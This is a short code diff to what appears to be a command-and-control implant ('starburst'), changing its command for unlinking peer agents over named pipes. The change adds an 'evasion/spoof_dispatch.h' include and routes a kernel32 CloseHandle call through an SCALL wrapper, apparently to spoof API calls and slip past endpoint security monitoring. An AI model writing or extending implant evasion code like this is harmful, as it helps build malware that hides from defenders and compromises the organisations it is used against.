@@ -4,6 +4,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_UNLINK
 
@@ -35,7 +36,7 @@ auto declfn starburst::cmd_unlink(
              str_ncmp( cur->agent_id, agent_uuid, agent_uuid_len ) == 0 ) {
             // close pipe
             if ( cur->h_pipe && cur->h_pipe != INVALID_HANDLE_VALUE ) {
-                inst.kernel32.CloseHandle( cur->h_pipe );
+                SCALL( inst, kernel32.CloseHandle, cur->h_pipe );
             }
 
             // unlink from list
